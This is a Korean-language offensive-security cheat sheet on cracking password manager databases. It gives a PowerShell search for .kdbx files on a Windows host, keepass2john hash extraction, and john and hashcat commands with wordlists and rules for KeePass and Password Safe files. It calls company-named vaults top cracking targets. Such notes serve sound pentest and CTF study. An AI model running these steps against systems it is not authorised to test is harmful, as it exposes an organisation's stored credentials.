## KeePass (.kdbx)

.kdbx는 KeePass 전용 암호화 DB 파일 포맷이다. 마스터 비밀번호 하나로 여러 계정의 크리덴셜을 통째로 보호하므로, 파일명이 회사명/특정 용도이면(예: CompanyName.kdbx) 그 안에 조직 전체 크리덴셜이 몰려있을 가능성이 높아 발견 시 최우선 크래킹 대상이다.

```
대상: KeePass 1.x / 2.x 데이터베이스 파일
방법: keepass2john으로 해시 추출 → john 또는 hashcat
특징: AES-256 암호화 + 강한 키 유도 (수천~수십만 라운드) → 느림
      키파일(keyfile)을 함께 사용하는 경우 반드시 -k 옵션 필요
```

### 윈도우 호스트에서 .kdbx 파일 찾기

```powershell
Get-ChildItem -Path C:\ -Recurse -Include *.kdbx -File -ErrorAction SilentlyContinue
```

```bash
# 해시 추출 (마스터 패스워드만 사용하는 경우)
keepass2john database.kdbx > keepass.hash

# 키파일도 함께 사용하는 경우
keepass2john -k keyfile.key database.kdbx > keepass.hash

# 해시 내용 확인
cat keepass.hash
# 예: database:$keepass$*2*60000*...  (파일명:해시 형식)

# john으로 크랙
john --wordlist=rockyou.txt keepass.hash
john --format=keepass --wordlist=rockyou.txt keepass.hash
john --show keepass.hash

# hashcat (파일명 부분 제거 필요)
keepass2john database.kdbx | cut -d: -f2 > keepass_only.hash

hashcat -m 13400 keepass_only.hash rockyou.txt
hashcat -m 13400 keepass_only.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 느리므로 짧은 리스트 + 룰이 현실적
hashcat -m 13400 keepass_only.hash \
  /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt

hashcat -m 13400 keepass_only.hash --show
```

## Password Safe (.psafe3)

```
대상: Password Safe v3 데이터베이스
방법: john은 파일 직접 지원 (변환 불필요)
      hashcat도 파일 직접 지원 (mode 5200)
특징: SHA-256 기반 키 유도, john과 hashcat 모두 .psafe3 파일을 직접 받음
```

```bash
# john — 변환 없이 파일 직접 사용
john --format=passwordsafe --wordlist=rockyou.txt database.psafe3
john --show --format=passwordsafe database.psafe3

# hashcat — 파일 직접 사용
hashcat -m 5200 database.psafe3 rockyou.txt
hashcat -m 5200 database.psafe3 rockyou.txt -r /usr/share/hashcat/rules/best64.rule

hashcat -m 5200 database.psafe3 --show
```
